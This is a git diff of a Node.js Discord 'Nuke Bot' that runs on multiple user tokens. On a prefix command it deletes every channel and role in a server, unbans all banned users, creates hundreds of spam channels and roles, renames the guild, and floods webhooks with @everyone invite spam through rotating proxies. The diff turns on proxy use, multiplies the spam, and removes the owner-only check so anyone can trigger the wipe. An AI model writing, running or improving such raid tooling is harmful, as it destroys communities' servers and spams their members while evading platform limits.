@@ -4,10 +4,12 @@ const proxies = fs.readFileSync('./variables/proxies.txt', 'utf-8').replace(/\r|
 const botconfig = require("./variables/botconfig.json");
 const Discord = require("discord.js");
 const request = require('request');
+const prompt = require('prompt');
 var chalk = require('chalk');
 var time = new Date().toDateString() + ' ' + new Date().toLocaleTimeString();
 const userid = botconfig.userid;
 const prefix = botconfig.prefix;
+
 process.on('unhandledRejection', e => {});
 process.on('uncaughtException', e => {});
 process.on('uncaughtRejection', e => {});
@@ -65,31 +67,36 @@ function admin(token, guild, everyone) {
     })
 }
 
-function webhookSpam(webhook) {
+async function webhookSpam(webhook) {
     var proxy = proxies[Math.floor(Math.random() * proxies.length)]
-    request({
-        method: "POST",
-        url: `https://discordapp.com/api/webhooks/${webhook.id}/${webhook.token}`,
-        //proxy: "http://" + proxy,
-        json: true,
-        headers: {
-            "Content-Type": "application/json",
-        },
-        json: {
-            "username": "Nuke Bot",
-            "content": `@everyone https://discord.gg/x2rntxtBpF  join`,
-            "avatar_url": "https://sm.mashable.com/mashable_sea/photo/default/man-fakes-death-cat-q6u_2z9w.png"
-        }
-    }, (err, res, body) => {
-		switch (res.statusCode) {
-			case 204:
-				return;
-				break;
-			default:
-				webhookSpam(webhook)
-				break;
-		}
-    })
+	var sent = 0; 
+	for(i = 0; i < 3; i++){
+		request({
+			method: "POST",
+			url: `https://discordapp.com/api/webhooks/${webhook.id}/${webhook.token}`,
+			proxy: "http://" + proxy,
+			json: true,
+			headers: {
+				"Content-Type": "application/json",
+			},
+			json: {
+				"username": "Nuke Bot",
+				"content": `@everyone https://discord.gg/x2rntxtBpF join KEK`,
+				"avatar_url": "https://sm.mashable.com/mashable_sea/photo/default/man-fakes-death-cat-q6u_2z9w.png"
+			}
+		}, (err, res, body) => {
+			switch (res.statusCode) {
+				case 204:
+					sent++;
+					console.log(`[Webhook Spamming] Messages Sent on Webhook ${webhook.id} ${sent}`); 
+					break;
+				default:
+					webhookSpam(webhook)
+					break;
+			}
+		})
+		
+	}
 }
 class bot {
     constructor(token) {
@@ -99,27 +106,29 @@ class bot {
     }
     start() {
         this.bot.on('ready', () => {
-            process.title = `[313] Nuke Bot`;
+            process.title = `[313] Nuke Bot | Created by Luci | Bots ${tokens.length}`;
             console.log(chalk.hex("FF0000")`
-                              ▐ ▄ ▄• ▄▌▄ •▄ ▄▄▄ .  ▄▄▄▄·       ▄▄▄▄▄
-                              •█▌▐██▪██▌█▌▄▌▪▀▄.▀·  ▐█ ▀█▪ ▄█▀▄ •██ 
-                              ▐█▐▐▌█▌▐█▌▐▀▀▄·▐▀▀▪▄  ▐█▀▀█▄▐█▌.▐▌ ▐█.▪
-                              ██▐█▌▐█▄█▌▐█.█▌▐█▄▄▌  ██▄▪▐█▐█▌.▐▌ ▐█▌·
-                              ▀▀ █▪ ▀▀▀ ·▀  ▀ ▀▀▀   ·▀▀▀▀  ▀█▄▀▪ ▀▀▀
-                                          Created by Luci`);
-            console.log("");
-            console.log(chalk.inverse.hex("00FF00")(`[LOGIN] ${time}: Logged into User Token ${this.bot.user.tag} (${this.bot.user.id})`));
-            console.log(chalk.inverse(`[INFO] Bot Prefix is set to: "${prefix}" this may be altered within the botconfig file!`));
-            console.log("");
+			███▄    █  █    ██  ██ ▄█▀ ▓█████      ▄▄▄▄    ▒█████  ▄▄▄█████▓
+			██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
+			▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███       ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
+			▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄  ▒▓█  ▄     ▒██░█▀  ▒██   ██░░ ▓██▓ ░ 
+			▒██░   ▓██░▒▒█████▓ ▒██▒ █▄▒░▒████    ▒░▓█  ▀█▓░ ████▓▒░  ▒██▒ ░ 
+			░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░     ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
+			░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░      ░▒░▒   ░   ░ ▒ ▒░     ░    
+			░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░        ░    ░ ░ ░ ░ ▒    ░      
+					░    ░     ░  ░   ░   ░      ░ ░          ░ ░           `);
+			console.log("");
+			console.log(chalk.hex("FF0000")(`[!] Created by Luci! Join our Support Server ${chalk.white('discord.gg/x2rntxtBpF')}`));
+			console.log("");
+            console.log(chalk.hex("FF0000")(`[!] ${time}: Logged into User Token ${this.bot.user.tag}`));
+            console.log(chalk(`[!] Bot Prefix is set to: [${prefix}]`));
+			console.log("");
         })
         this.bot.on("message", async message => {
             let messageArray = message.content.split(" ");
             let args = messageArray.slice(1);
             if (message.author.bot) return;
             if (message.content.startsWith(`${prefix}nuke`)) {
-                if (message.author.id != userid) {
-                    return console.log(`[ERR] ${message.author} Attempted to Run Nuke Command`);
-                }
                 let guild = message.guild.id;
                 let everyone = message.guild.defaultRole.id;
                 admin(this.token, guild, everyone);
@@ -129,23 +138,27 @@ class bot {
                 });
                 message.guild.channels.forEach(channel => channel.delete())
                 message.guild.roles.map(r => r.delete().catch(err => {}));
-				//=============
-				//Unban All Work In Progress!
-                //message.guild.fetchBans().forEach(member => message.guild.members.unban(ban.user.id))
-				//=============
+				//
+				message.guild.fetchBans().then(bans => {
+                    if (bans.size == 0) { return console.log("There are no banned users."); }
+                    bans.forEach(ban => {
+                        guild.unban(ban.id);
+                    });
+				})
+				//
                 for (let i = 0; i < 250; i++) {
-                    message.guild.createChannel("SQL is Sexy", {
+                    message.guild.createChannel("Nuked", {
                         type: "text"
                     }).then(channel => {
-                        channel.createWebhook("Testerrr").then(webhook => {
+                        channel.createWebhook("God").then(webhook => {
                             webhookSpam(webhook);
                         })
                     })
-                    message.guild.createChannel("SQL IS HOT", {
+                    message.guild.createChannel("Nuked", {
                         type: "Voice"
                     }).catch("");
                     message.guild.createRole({
-                        name: `{"type":"error","title":"SQL"}`,
+                        name: `{"type":"error","title":"Nuking"}`,
                         color: "RANDOM",
                         permissions: []
                     })
@@ -153,8 +166,11 @@ class bot {
                 message.guild.setName('NUKED').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
                 console.log(chalk.hex("66FF00")("[NUKE] Server has been nuked"));
             }
+			if (message.content.startsWith(`${prefix}NewCommand`)) {
+				console.log("Under Development");
+			}
         });
-        this.bot.login(this.token).catch(err => console.log(chalk.red(`${time} Error: Invalid Token!`.inverse)));
+        this.bot.login(this.token).catch(err => console.log(chalk.inverse.red(`${time} Error: Invalid Token!`)));
     }
 }
 tokens.forEach(token => new bot(token).start());
